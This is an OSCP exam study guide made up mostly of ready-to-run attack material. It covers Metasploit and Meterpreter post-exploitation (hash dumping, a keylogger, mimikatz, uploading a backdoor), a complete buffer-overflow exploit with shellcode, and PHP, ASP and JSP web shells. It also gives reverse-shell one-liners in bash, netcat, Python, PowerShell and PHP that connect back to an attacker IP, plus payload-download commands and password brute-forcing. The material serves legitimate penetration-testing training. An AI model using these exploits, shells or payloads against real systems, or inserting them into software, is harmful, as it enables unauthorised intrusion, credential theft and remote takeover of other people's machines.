# Exploitation Tools and Techniques

This guide covers essential exploitation tools and techniques relevant to OSCP. Understanding how to effectively use these tools is crucial for successful penetration testing.

## Metasploit Framework

The Metasploit Framework is a powerful penetration testing platform that provides a comprehensive environment for developing, testing, and executing exploits.

### Basic Usage

#### Starting Metasploit
```bash
# Start Metasploit console
msfconsole

# Start without the banner
msfconsole -q
```

#### Finding Exploits
```bash
# Search for exploits
search type:exploit platform:windows ms17-010

# Show exploit details
info exploit/windows/smb/ms17_010_eternalblue

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
```

#### Setting Options
```bash
# Show required options
show options

# Set target
set RHOSTS 192.168.1.10

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host (your machine)
set LHOST 192.168.1.5

# Set local port
set LPORT 4444
```

#### Running Exploits
```bash
# Check if target is vulnerable
check

# Run the exploit
exploit

# Run in background
exploit -j
```

#### Session Management
```bash
# List sessions
sessions -l

# Interact with a session
sessions -i 1

# Background current session
background

# Kill a session
sessions -k 1
```

### Meterpreter Basics

Meterpreter is an advanced payload that provides a command interpreter for post-exploitation.

#### System Commands
```bash
# Get system information
sysinfo

# Get current user
getuid

# Get privileges
getprivs

# List processes
ps

# Migrate to another process
migrate 1234
```

#### File System Commands
```bash
# Show current directory
pwd

# Change directory
cd C:\\Windows\\System32

# List files
ls

# Download a file
download C:\\Windows\\System32\\config\\SAM /home/kali/SAM

# Upload a file
upload /home/kali/backdoor.exe C:\\Windows\\backdoor.exe
```

#### Network Commands
```bash
# Show network interfaces
ipconfig

# Show routing table
route

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.10
```

#### Privilege Escalation
```bash
# Get system privileges
getsystem

# Load PowerShell extension
load powershell

# Execute PowerShell commands
powershell_execute "Get-LocalUser"
```

### Metasploit Modules

#### Auxiliary Modules
```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run

# FTP scanning
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

#### Post-Exploitation Modules
```bash
# Dump hashes
use post/windows/gather/hashdump
set SESSION 1
run

# Keylogger
use post/windows/capture/keylog_recorder
set SESSION 1
run

# Mimikatz
use post/windows/gather/credentials/mimikatz
set SESSION 1
run
```

### OSCP Restrictions

**Important Note**: The OSCP exam restricts the use of Metasploit. You can only use Metasploit (including msfvenom) for one machine in the exam. For all other machines, you must use manual exploitation techniques.

## SearchSploit

SearchSploit is a command-line search tool for Exploit-DB that allows you to search for exploits offline.

```bash
# Basic search
searchsploit apache 2.4.49

# Detailed output
searchsploit -p 50572

# Search by CVE
searchsploit --cve 2021-41773

# Copy exploit to current directory
searchsploit -m 50572

# Update the database
searchsploit -u
```

## Manual Exploitation Techniques

### Buffer Overflow Exploitation

#### Tools for Buffer Overflow
1. **Immunity Debugger**: Windows debugger for analyzing vulnerable applications
2. **SPIKE**: Fuzzing tool for finding buffer overflows
3. **Pattern_create.rb/pattern_offset.rb**: Tools for finding the exact offset
4. **Mona.py**: Plugin for Immunity Debugger to assist in exploit development

#### Buffer Overflow Methodology
1. **Fuzzing**: Send increasingly long strings to identify vulnerable parameters
   ```python
   #!/usr/bin/python
   import socket
   
   buffer = "A" * 100
   while len(buffer) <= 4000:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(("192.168.1.10", 9999))
           s.send(buffer + "\r\n")
           s.close()
           print("Sent buffer of length: {}".format(len(buffer)))
           buffer = buffer + "A" * 100
       except:
           print("Application crashed at buffer length: {}".format(len(buffer)))
           break
   ```

2. **Finding the Offset**: Determine the exact number of bytes needed to reach the EIP register
   ```bash
   # Create a pattern
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
   
   # Find the offset after crash
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
   ```

3. **Controlling EIP**: Verify control of the EIP register
   ```python
   buffer = "A" * 2003 + "B" * 4 + "C" * 500
   ```

4. **Finding Bad Characters**: Identify characters that might break the exploit
   ```python
   badchars = (
       "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
       "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
       "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
       "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
       "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
       "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
       "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
       "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
       "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
       "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
       "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
       "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
       "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
       "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
       "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
       "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
   )
   
   buffer = "A" * 2003 + "B" * 4 + badchars
   ```

5. **Finding a JMP ESP Instruction**: Locate a reliable address to jump to your shellcode
   ```
   # In Immunity Debugger with mona.py
   !mona modules
   !mona find -s "\xff\xe4" -m module.dll
   ```

6. **Generating Shellcode**: Create shellcode that avoids bad characters
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f python -b "\x00" EXITFUNC=thread
   ```

7. **Final Exploit**: Combine all elements into a working exploit
   ```python
   #!/usr/bin/python
   import socket
   
   # Shellcode generated with msfvenom
   shellcode = (
       "\xbd\x9e\x5e\x55\x0e\xda\xd8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
       "\x52\x31\x6a\x12\x03\x6a\x12\x83\x72\x5f\x32\x6b\x70\x77\x31"
       # ... rest of shellcode ...
   )
   
   # Buffer structure
   buffer = "A" * 2003                      # Padding to reach EIP
   buffer += "\xaf\x11\x50\x62"             # JMP ESP address (little-endian)
   buffer += "\x90" * 16                    # NOP sled
   buffer += shellcode                      # Shellcode
   
   try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect(("192.168.1.10", 9999))
       s.send(buffer + "\r\n")
       s.close()
       print("Exploit sent!")
   except:
       print("Could not connect to target.")
   ```

### Web Shell Techniques

#### PHP Web Shells
```php
// Basic PHP web shell
<?php system($_GET['cmd']); ?>

// More advanced PHP web shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

#### ASP/ASPX Web Shells
```aspx
<!-- Basic ASP web shell -->
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

#### JSP Web Shells
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<br>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
```

### Reverse Shell Techniques

#### Netcat Reverse Shells
```bash
# Target machine (Linux)
nc -e /bin/bash 192.168.1.5 4444

# Target machine (Windows)
nc -e cmd.exe 192.168.1.5 4444

# If -e option is not available (Linux)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f
```

#### Bash Reverse Shells
```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Alternative
0<&196;exec 196<>/dev/tcp/192.168.1.5/4444; sh <&196 >&196 2>&196
```

#### Python Reverse Shells
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PowerShell Reverse Shells
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### PHP Reverse Shells
```php
<?php
$sock=fsockopen("192.168.1.5",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

### File Transfer Techniques

#### Linux File Transfers
```bash
# Using wget
wget http://192.168.1.5:8000/file.txt

# Using curl
curl http://192.168.1.5:8000/file.txt -o file.txt

# Using netcat (receiver)
nc -lvp 1234 > file.txt

# Using netcat (sender)
nc 192.168.1.10 1234 < file.txt

# Using Python HTTP server (sender)
python -m SimpleHTTPServer 8000
python3 -m http.server 8000
```

#### Windows File Transfers
```powershell
# Using PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.5:8000/file.exe', 'C:\Windows\Temp\file.exe')"

# Using certutil
certutil -urlcache -split -f "http://192.168.1.5:8000/file.exe" file.exe

# Using bitsadmin
bitsadmin /transfer mydownloadjob /download /priority normal http://192.168.1.5:8000/file.exe C:\Windows\Temp\file.exe

# Using SMB (set up SMB share on Kali first)
copy \\192.168.1.5\share\file.exe C:\Windows\Temp\file.exe
```

## Password Attacks

### Hydra

Hydra is a parallelized login cracker that supports numerous protocols.

```bash
# SSH brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# SMB brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb
```

### John the Ripper

John the Ripper is a fast password cracker for various hash types.

```bash
# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# Crack Windows hashes
john --format=NT hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### Hashcat

Hashcat is a powerful hash cracking tool that supports GPU acceleration.

```bash
# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack SHA-1 hashes
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM hashes
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Brute force (incremental)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## OSCP-Relevant Exploitation Strategies

### Initial Access

1. **Identify vulnerabilities**: Use Nmap scripts, searchsploit, and manual enumeration
2. **Research exploits**: Find public exploits for identified vulnerabilities
3. **Adapt exploits**: Modify exploits as needed for the target environment
4. **Test exploits**: Verify exploits work in a controlled environment before using on the target
5. **Execute exploits**: Run the exploit against the target to gain initial access

### Privilege Escalation

1. **Enumerate the system**: Gather information about the target system
2. **Identify privilege escalation vectors**: Look for misconfigurations, vulnerable services, etc.
3. **Exploit weaknesses**: Use appropriate techniques to escalate privileges
4. **Maintain access**: Establish persistence on the system

### Post-Exploitation

1. **Gather sensitive information**: Collect passwords, hashes, and other valuable data
2. **Pivot to other systems**: Use the compromised system to access other systems
3. **Document findings**: Record all actions and findings for reporting
4. **Clean up**: Remove artifacts of the penetration test

## OSCP Exam Tips

1. **Practice manual exploitation**: The OSCP exam limits Metasploit usage, so focus on manual techniques.

2. **Master buffer overflows**: Buffer overflow exploitation is a key component of the OSCP exam.

3. **Understand exploit code**: Don't just run exploits; understand how they work and be able to modify them.

4. **Create a methodology**: Develop a systematic approach to exploitation to avoid missing critical steps.

5. **Document everything**: Keep detailed notes of all exploitation attempts, successful or not.

6. **Have multiple shells**: Always try to get multiple shells on a target in case one is lost.

7. **Transfer files efficiently**: Practice various file transfer methods for different scenarios.

8. **Upgrade shells**: Know how to upgrade from a basic shell to a more functional one.

9. **Be persistent**: If one exploitation technique fails, try another approach.

10. **Time management**: Allocate time wisely between different targets in the exam.
